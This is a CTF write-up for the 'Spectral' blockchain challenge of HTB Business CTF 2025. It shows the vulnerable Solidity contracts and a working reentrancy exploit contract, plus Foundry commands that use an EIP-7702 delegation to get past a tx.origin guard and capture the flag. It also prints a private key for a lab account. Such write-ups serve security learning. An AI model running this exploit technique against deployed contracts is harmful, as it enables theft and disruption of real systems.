---
title: HTB Business CTF 2025 Blockchain Challenges
date: 2025-05-27 00:00:00 +0000
categories: [CTF, Blockchain]
tags: [htb, foundry, docker, smartcontracts, solidity]
---

![Hack the Box Business CTF 2025 Logo](/assets/img/posts/HTB-Business-CTF-2025-logo.jpg){: width="700" height="400" }

## Enlistment [Very Easy]

## Spectral [Easy]

`TODO`

### Description

`A new nuclear power plant called "VCNK" has been built in Volnaya, and now the dominance of the energy lobby is now stronger than ever. You have been assigned to Operation "Blockout" and your mission is to find a way to disrupt the power plant to slow them down. See you in the dark!`

### Setup.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import { VCNK } from "./VCNK.sol";

contract Setup {
    VCNK public TARGET;

    event DeployedTarget(address at);

    constructor() {
        TARGET = new VCNK();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        uint8 CU_STATUS_EMERGENCY = 3;
        (uint8 status, , , ) = TARGET.controlUnit();
        return status == CU_STATUS_EMERGENCY;
    }
}
```

### VCNK.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

/*
  _   __     __                      _____         __           ___            __  _  __         __               __ __                 __
 | | / /__  / /__  ___ ___ _____ _  / ___/__ ___  / /________ _/ (_)__ ___ ___/ / / |/ /_ ______/ /__ ___ _____  / //_/__ _______  ___ / /
 | |/ / _ \/ / _ \/ _ `/ // / _ `/ / /__/ -_) _ \/ __/ __/ _ `/ / /_ // -_) _  / /    / // / __/ / -_) _ `/ __/ / ,< / -_) __/ _ \/ -_) / 
 |___/\___/_/_//_/\_,_/\_, /\_,_/  \___/\__/_//_/\__/_/  \_,_/_/_//__/\__/\_,_/ /_/|_/\_,_/\__/_/\__/\_,_/_/   /_/|_|\__/_/ /_//_/\__/_/  
                      /___/                                                                                                               
                                                      Volnaya Centralized Nuclear Kernel
*/

interface vcnkCompatibleReceiver {
  function deliverEnergy(uint256 amount) external returns (bool);
}

contract VCNK {
  ControlUnit public controlUnit;
  mapping(address => Gateway) public gateways;

  uint8 constant CU_STATUS_IDLE = 1;
  uint8 constant CU_STATUS_DELIVERING = 2;
  uint8 constant CU_STATUS_EMERGENCY = 3;
  uint8 constant GATEWAY_STATUS_UNKNOWN = 0;
  uint8 constant GATEWAY_STATUS_IDLE = 1;
  uint8 constant GATEWAY_STATUS_ACTIVE = 2;
  uint8 constant MAX_GATEWAYS = 5;
  uint256 constant MAX_CAPACITY = 100 ether;
  uint256 constant MAX_ALLOWANCE_PER_GATEWAY = 10 ether;
  uint256 constant GATEWAY_REGISTRATION_FEE = 20 ether;
  uint256 constant FAILSAFE_THRESHOLD = 10 ether;

  struct ControlUnit {
    uint8 status;
    uint256 registeredGateways;
    uint256 currentCapacity;
    uint256 allocatedAllowance;
  }
  
  struct Gateway {
    uint8 status;
    uint256 quota;
    uint256 totalUsage;
  }

  event GatewayRegistered(address indexed gateway);
  event GatewayQuotaIncrease(address indexed gateway, uint256 quotaAmount);
  event PowerDeliveryRequest(address indexed gateway, uint256 powerAmount);
  event PowerDeliverySuccess(address indexed gateway, uint256 powerAmount);
  event ControlUnitEmergencyModeActivated();

  modifier failSafeMonitor() {
    if (controlUnit.currentCapacity <= FAILSAFE_THRESHOLD) {
      controlUnit.status = CU_STATUS_EMERGENCY;
      emit ControlUnitEmergencyModeActivated();
    }
    else {
      _;
    }
  }

  modifier circuitBreaker() {
    require(msg.sender == tx.origin, "[VCNK] Illegal reentrant power delivery request detected.");
    _;
  }

  constructor() {
    controlUnit.status = CU_STATUS_IDLE;
    controlUnit.currentCapacity = MAX_CAPACITY;
    controlUnit.allocatedAllowance = 0;
  }

  function registerGateway(address _gateway) external payable circuitBreaker failSafeMonitor {
    require(
      controlUnit.registeredGateways < MAX_GATEWAYS,
      "[VCNK] Maximum number of registered gateways reached. Infrastructure will be scaled up soon, sorry for the inconvenience."
    );
    require(msg.value == GATEWAY_REGISTRATION_FEE, "[VCNK] Registration fee must be 20 ether.");
    Gateway storage gateway = gateways[_gateway];
    require(gateway.status == GATEWAY_STATUS_UNKNOWN, "[VCNK] Gateway is already registered.");
    gateway.status = GATEWAY_STATUS_IDLE;
    gateway.quota = 0;
    gateway.totalUsage = 0;
    controlUnit.registeredGateways += 1;
    emit GatewayRegistered(_gateway);
  }

  function requestQuotaIncrease(address _gateway) external payable circuitBreaker failSafeMonitor {
    require(msg.value > 0, "[VCNK] Deposit must be greater than 0.");
    Gateway storage gateway = gateways[_gateway];
    require(gateway.status != GATEWAY_STATUS_UNKNOWN, "[VCNK] Gateway is not registered.");
    uint256 currentQuota = gateway.quota;
    require(currentQuota + msg.value <= MAX_ALLOWANCE_PER_GATEWAY, "[VCNK] Requested quota exceeds maximum allowance per gateway.");
    gateway.quota += msg.value;
    controlUnit.allocatedAllowance += msg.value;
    emit GatewayQuotaIncrease(_gateway, msg.value);
  }

  function requestPowerDelivery(uint256 _amount, address _receiver) external circuitBreaker failSafeMonitor {
    Gateway storage gateway = gateways[_receiver];
    require(gateway.status == GATEWAY_STATUS_IDLE, "[VCNK] Gateway is not in a valid state for power delivery.");
    require(_amount > 0, "[VCNK] Requested power must be greater than 0.");
    require(_amount <= gateway.quota, "[VCNK] Insufficient quota.");
    
    emit PowerDeliveryRequest(_receiver, _amount);
    controlUnit.status = CU_STATUS_DELIVERING;
    controlUnit.currentCapacity -= _amount;

    vcnkCompatibleReceiver(_receiver).deliverEnergy(_amount);
    gateway.totalUsage += _amount;

    controlUnit.currentCapacity = MAX_CAPACITY;
    emit PowerDeliverySuccess(_receiver, _amount);
  }
}
```

### Solution 

A rough, quick writeup with a full solution to Spectral using Foundry. I plan to update this post with a more detailed solution soon.

#### Exploit.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {vcnkCompatibleReceiver, VCNK} from "./VCNK.sol";

contract Exploit is vcnkCompatibleReceiver {
    VCNK public target;
    uint public reentrantCount;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = VCNK(_target);
    }

    function initialize(address _target) public {
        owner = msg.sender;
        target = VCNK(_target);
    }

    function exploit() external {
        target.requestPowerDelivery(10 ether, address(this));
    }

    function deliverEnergy(uint256 amount) external override returns (bool) {
        reentrantCount++;
        if (reentrantCount < 10) {
            target.requestPowerDelivery(10 ether, address(this));
        }
        return true;
    }

    receive() external payable {}
}
```

```bash
# Resources
#   Foundry
#     - https://github.com/foundry-rs/forge-std 
#   Tutorial for EIP-7702 transaction with Foundry
#     - https://docs.berachain.com/developers/guides/eip7702-basics#step-5-set-helloworld-code-for-eoa

# In unzipped challenge directory, place Exploit.sol in ./src directory
# Initialize Foundry project with forge command
forge init --force

# Connect to Docker container and get connection info (usually second IP and port)
nc <IP> <port>

# Export env variables (RPC endpoint usuall first IP and port)
export PK=
export PLAYER=
export TARGET=
export RPC=http://<rpc_endpoint>

# Deploy Exploit.sol
forge create --rpc-url $RPC --private-key $PK --broadcast src/Exploit.sol:Exploit --constructor-args $TARGET

# Export Exploit.sol address as env variable
export EXPLOIT=

# Register player externally owned account (EoA) as gateway
cast send $TARGET "registerGateway(address)" $PLAYER --value 20ether --rpc-url $RPC --private-key $PK

# Increase player EoA gateway quota
cast send $TARGET "requestQuotaIncrease(address)" $PLAYER --value 10ether --rpc-url $RPC --private-key $PK

# Confirm gateway and quota
cast call $TARGET "gateways(address)(uint8,uint256,uint256)" $PLAYER --rpc-url $RPC

# Set up env variables for separate signing account for EIP-7702 transaction
# https://docs.berachain.com/developers/guides/eip7702-basics#step-5-set-helloworld-code-for-eoa
export OTHER_PLAYER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
export OTHER_PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

# Send other account 1 ETH for auth transaction
cast send $OTHER_PLAYER --value 1ether --private-key $PK --rpc-url $RPC
cast balance $OTHER_PLAYER --rpc-url $RPC

# Created authorization for player EoA and Exploit.sol contract
SIGNED_AUTH=$(cast wallet sign-auth $EXPLOIT --private-key $PK --rpc-url $RPC)

# Set the Exploit.sol code for the player EoA
cast send $(cast az) --private-key $OTHER_PK --auth $SIGNED_AUTH --rpc-url $RPC

# Confirm Exploit.sol code at player EoA
cast code $PLAYER --rpc-url $RPC

# Initialize Exploit.sol code at player EoA (populate contract storage)
# https://docs.berachain.com/developers/guides/eip7702-basics#step-7-verify-eoa-code-set
cast send $PLAYER "initialize(address)" --private-key $OTHER_PK --rpc-url $RPC $TARGET

# Conduct reentrency attack with signed EIP-7702 transaction to bypass circuitBreaker() check
cast send $PLAYER "exploit()" --rpc-url $RPC --private-key $PK

# Reconnect to Docker container to get the flag
nc <IP> <port>
HTB{Pectra_UpGr4d3_c4uSed_4_sp3cTraL_bL@cK0Ut_1n_V0LnaYa}
```

## Blockout [Medium]

`TODO`